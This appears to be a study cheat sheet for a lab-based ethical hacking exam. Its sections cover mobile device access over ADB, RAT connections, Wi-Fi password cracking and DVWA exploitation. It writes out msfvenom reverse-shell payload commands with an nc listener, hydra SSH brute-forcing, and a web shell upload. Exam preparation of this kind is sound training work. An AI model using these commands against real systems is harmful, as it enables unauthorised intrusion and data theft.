# Finding and Accessing Mobile Devices
1. sudo nmap -p 192.168.0.0/24
2. adb connect <target_ip>:5555
3. adb shell
4. Use ls, cd and pwd to navigate
5. adb pull to get certain files

# Example Question ELF
A mobile device in the 192.168.0.0/24 subnet has malicious files. Obtain the elf files and find the hash of the file with the highest entropy value
1. Refer to #Finding and Accessing Mobile Devices to obtain files
2. After obtaining all files, use entropy tool to determine highest value
3. ent -h OR apt install ent
4. ent <files found> 
    - Determine highest value after scanning all files
5. sha384sum <file>
    - good for determining SHA 384 Hashes

# Encrypted Volumes
1. Use Veracrypt to decrypt the volume
2. Select File... -> Choose a Drive to mount on -> Mount
3. There is normally a password to decrypt. It should be provided somewhere.
4. Go to unlocked Drive, do your task.

# Cracking Hashes
1. Use www.hashes.com

# Remote Access Trojans (RAT)
1. Try to find unusual ports by running
2. nmap -T5 -A -p- <ip> (will take time)
3. Find the unusual port and then go to Windows Box
4. CEH Module 7 Malware Threats -> Trojan Types -> RAT -> Theef
5. Input ip and port and connect
6. Select 'file explorer' to browse through directory

# Hash Tampering
1. Use MD5 Calculator to compare hashes

# Finding files in DVWA
If given a link (http://192.168.0.##:8080/DVWA)
And a path Eg. “C:\wamp64\www\DVWA\hackable\uploads\”
1. Take the tail of the path (\hackable\uploads\) and add it to the end of the link
2. Should show a file directory with target files.

# Analyzing IoT Traffic
1. Use Wireshark and filter by MQTT
2. Finding a message or topic should be in the info section

# Analyzing Wireless Traffic
1. Use aircrack-ng <.cap file>
2. aircrack-ng -b <MAC address> -w '<Password list>' '<.cap file>'
3. Should output the password

# Reverse Shells
1. If asked to perform vulnerability research on a webapp, try using Zap
2. Eg. If scanning DVWA, you'll find file inclusion/file upload vulnerabilities
3. Use metasploit to create a reverse shell
4. msfconsole
5. msfvenom -p php/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw >exploit.php 
    - Creates a php file with a reverse shell going to localhost:4444
6. >use exploit/multi/handler
    - Handles the exploit and gives shell
7. >set payload php/meterpreter/reverse_tcp
8. Set LHOST <target ip>
9. Upload the created exploit.php file
10. Open a terminal and type run. Put URL into browser and should create a meterpreter session.
11. ls to look for target files

# Reverse Shell Alt Scenario
A target that has remote login and command-line execution and is running Linux. Gain access and find a target file. (subnet is 192.168.0.0/24)
1. nmap -p 22,23,80,3389 192.168.0.0/24
    - Check ssh, telnet, tcp and rdp (in this example, found 192.168.0.100)
2. sudo nmap -sS -sV -p- -O 192.168.0.100
    - Eg. Found open telnet port
3. telnet 192.168.0.100 80 and GET / HTTP/1.0
4. Try using hydra to break weak credentials on ssh
5. hydra -L user.txt -P pass.txt 192.168.0.100 ssh
    - Eg. Found ubuntu user with weak password
6. ssh ubuntu@192.168.0.100
7. telnet 192.168.0.100
8. Once inside, create reverse shell with metasploit
    - msfvenom -p cmd/unix/reverse_netcat LHOST=<my_ip> LPORT=4444
9. Listen on port 4444 from own machine
    - nc -nvlp 4444
10. Once shell is obtained, find file with the following command:
    - find . -name target.txt